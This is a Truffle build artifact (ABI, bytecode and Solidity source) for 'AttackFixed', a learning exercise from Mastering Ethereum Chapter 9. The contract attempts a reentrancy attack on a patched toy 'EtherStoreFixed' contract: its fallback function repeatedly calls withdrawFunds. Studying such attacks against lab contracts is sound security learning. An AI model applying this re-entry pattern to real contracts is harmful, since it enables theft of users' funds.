{
  "contractName": "AttackFixed",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_untrustedEtherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "LogFallbackCall",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "untrustedEtherStore",
      "outputs": [
        {
          "internalType": "contract EtherStoreFixed",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attackUntrustedEtherStore",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610c8c380380610c8c8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050600061005461013960201b60201c565b9050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610141565b600033905090565b610b3c806101506000396000f3fe6080604052600436106100595760003560e01c8063715018a6146101ac5780638da5cb5b146101c357806393b33d8b1461021a578063bb32631214610271578063f2fde38b1461027b578063ff11e1db146102cc57610060565b3661006057005b7feeda8ea091404366d8f352cf63bd9e6eca7a4aec8475bb8915d44464b90a14cd3334604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101aa57600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561019157600080fd5b505af11580156101a5573d6000803e3d6000fd5b505050505b005b3480156101b857600080fd5b506101c16102e3565b005b3480156101cf57600080fd5b506101d861046b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561022657600080fd5b5061022f610494565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6102796104ba565b005b34801561028757600080fd5b506102ca6004803603602081101561029e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610723565b005b3480156102d857600080fd5b506102e1610930565b005b6102eb610ad8565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146103ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6104c2610ad8565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610583576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b670de0b6b3a7640000341015610601576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f526571756972657320312065746865722e00000000000000000000000000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561067357600080fd5b505af1158015610687573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561070957600080fd5b505af115801561071d573d6000803e3d6000fd5b50505050565b61072b610ad8565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146107ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610872576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526026815260200180610ae16026913960400191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b610938610ad8565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146109f9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b60003373ffffffffffffffffffffffffffffffffffffffff164760405180600001905060006040518083038185875af1925050503d8060008114610a59576040519150601f19603f3d011682016040523d82523d6000602084013e610a5e565b606091505b5050905080610ad5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f5472616e73616374696f6e206661696c65642e0000000000000000000000000081525060200191505060405180910390fd5b50565b60003390509056fe4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373a264697066735822122033d51790604e8a2797c86bdd258d14865accb5dde6d7079db3943a3847e20b8364736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport {EtherStoreFixed as UntrustedEtherStore} from \"./EtherStoreFixed.sol\";\n\n/**\n * @title Mastering Ethereum Chapter 9, Attack contract.\n * @author Victor Navascues.\n * @notice Attempts to exploit EtherStoreFixed contract.\n * @dev This contract differs from the book implementation in:\n *  - It inherits from oppenzeppelin access `Ownable` contract, implementing\n *  an access modifier in the `collectEther()` function. Just for learning\n *  purposes.\n *\n *  - It implements some Consensys' best practices (link below):\n *    - https://consensys.github.io/smart-contract-best-practices/recommendations\n *\n *    - Contract layout (type declarations, state variables, events, and\n *    functions).\n *    - Mark untrusted contracts. NA.\n *    - Function arguments with leading underscore.\n *    - Log names starting with `Log`.\n *    - Don't use `transfer()` or `send()`.\n *    - Handle errors in external calls.\n *    - Use modifiers only for checks.\n *    - Improved `fallback()` (e.g. simple, log an event, and check data\n *    length). NA.\n *    - Use events to monitor contract activity.\n *    - Lock pragmas to specific compiler version. NA.\n *\n *  - Added the optional message in `require()`.\n */\ncontract AttackFixed is Ownable {\n    UntrustedEtherStore public untrustedEtherStore;\n\n    event LogFallbackCall(address _sender, uint256 _value);\n\n    constructor(address _untrustedEtherStoreAddress) public {\n        untrustedEtherStore = UntrustedEtherStore(_untrustedEtherStoreAddress);\n    }\n\n    receive() external payable {}\n\n    function attackUntrustedEtherStore() public payable onlyOwner {\n        require(msg.value >= 1 ether, \"Requires 1 ether.\");\n        untrustedEtherStore.depositFunds{value: 1 ether}();\n        untrustedEtherStore.withdrawFunds(1 ether);\n    }\n\n    function collectEther() public onlyOwner {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(success, \"Transaction failed.\");\n    }\n\n    fallback() external payable {\n        // Log `fallback()` calls for checking successful reentrancy attacks.\n        emit LogFallbackCall(msg.sender, msg.value);\n\n        if (address(untrustedEtherStore).balance > 1 ether) {\n            untrustedEtherStore.withdrawFunds(1 ether);\n        }\n    }\n}\n",
  "sourcePath": "/home/victor/Projects/ethereum/solidity_playground/mastering_ethereum/truffle/SCSecurity/contracts/reentrancy_attack/AttackFixed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.2.1",
  "updatedAt": "2020-07-13T14:57:06.618Z",
  "devdoc": {
    "author": "Victor Navascues.",
    "details": "This contract differs from the book implementation in:  - It inherits from oppenzeppelin access `Ownable` contract, implementing  an access modifier in the `collectEther()` function. Just for learning  purposes.  - It implements some Consensys' best practices (link below):    - https://consensys.github.io/smart-contract-best-practices/recommendations    - Contract layout (type declarations, state variables, events, and    functions).    - Mark untrusted contracts. NA.    - Function arguments with leading underscore.    - Log names starting with `Log`.    - Don't use `transfer()` or `send()`.    - Handle errors in external calls.    - Use modifiers only for checks.    - Improved `fallback()` (e.g. simple, log an event, and check data    length). NA.    - Use events to monitor contract activity.    - Lock pragmas to specific compiler version. NA.  - Added the optional message in `require()`.",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "title": "Mastering Ethereum Chapter 9, Attack contract."
  },
  "userdoc": {
    "methods": {},
    "notice": "Attempts to exploit EtherStoreFixed contract."
  }
}